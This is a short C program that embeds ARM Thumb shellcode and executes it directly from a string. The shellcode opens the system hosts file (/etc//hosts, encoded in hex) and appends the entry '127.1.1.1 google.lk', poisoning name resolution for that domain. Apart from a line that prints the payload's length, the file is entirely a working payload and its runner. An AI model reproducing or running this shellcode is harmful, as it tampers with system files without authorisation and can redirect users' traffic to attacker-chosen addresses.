
#include <stdio.h>
#include <string.h>

char *shellcode = "\x01\x60\x8f\xe2"
                  "\x16\xff\x2f\xe1"
                  "\x24\x1b"
                  "\x22\x1c"
                  "\xff\x21"
                  "\xff\x31"
                  "\xff\x31"
                  "\xff\x31"
                  "\x05\x31"
                  "\x78\x46"
                  "\x2a\x30"
                  "\x05\x27"
                  "\x01\xdf"
                  "\x14\x22" // movs    r2, $0x14 ; length
                  "\x79\x46"
                  "\x0c\x31"
                  "\x04\x27"
                  "\x01\xdf"
                  "\x24\x1b"
                  "\x20\x1c"
                  "\x01\x27"
                  "\x01\xdf"
                  "\x31\x32\x37\x2e" // 127.
                  "\x31\x2e\x31\x2e" // 1.1.
                  "\x31\x20\x67\x6f" // 1 go
                  "\x6f\x67\x6c\x65" // ogle
                  "\x2e\x6c\x6b\x0a" // .lk
                  "\x2f\x65\x74\x63"
                  "\x2f\x2f\x68\x6f"
                  "\x73\x74\x73";

int main(void) {
  fprintf(stdout, "Length: %d\n", strlen(shellcode));
  (*(void (*)())shellcode)();
  return 0;
}